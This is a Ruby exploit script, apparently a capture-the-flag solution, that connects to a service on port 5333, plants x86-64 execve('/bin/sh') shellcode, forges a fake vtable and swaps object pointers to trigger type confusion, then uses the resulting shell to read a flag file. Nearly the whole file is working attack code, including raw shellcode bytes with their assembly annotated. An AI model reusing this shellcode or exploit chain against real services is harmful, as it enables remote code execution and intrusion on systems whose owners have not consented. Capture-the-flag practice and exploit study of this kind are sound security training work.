require "socket"

# require proper usage
if not ARGV[0]
    abort "Usage: #{__FILE__} <host>"
end

# create socket connection
host = ARGV[0]
port = 5333
s = TCPSocket.open(host, port)

# set up shellcode
#   xor eax, eax
#   mov rbx, 0xFF978CD091969DD1
#   neg rbx
#   push rbx
#   push rsp
#   pop rdi
#   cdq
#   push rdx
#   push rdi
#   push rsp
#   pop rsi
#   mov al, 0x3B
#   syscall
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# perform exploit
s.readpartial(2048)                                     # read welcome and prompt
s.write("c 0 #{sc}\n")                                  # create string containing shellcode
buf = s.readpartial(1024).split(" ")[-1].to_i           # read back string id

s.readpartial(1024)                                     # read prompt
s.write("c 0 AAAAAAAABBBBBBBB#{[buf].pack("Q<")}\n")    # create string containing fake vtable
ptr = s.readpartial(1024).split(" ")[-1].to_i           # read back string id

s.readpartial(1024)                                     # read prompt
s.write("c 1 AAAA\n")                                   # create dummy string object
id = s.readpartial(1024).split(" ")[-1].to_i            # read back string id

s.readpartial(1024)                                     # read prompt
s.write("u #{id} #{[ptr].pack("Q<")}\n")                # swap string object ptr with raw string ptr
id = s.readpartial(1024).split(" ")[-1].to_i            # read back string id

s.readpartial(1024)                                     # read prompt
s.write("r #{id}\n")                                    # trigger type confusion

s.write("cat /home/amazon/flag\n")                      # send command
puts s.readpartial(1024)                                # print flag

# clean up
s.close()
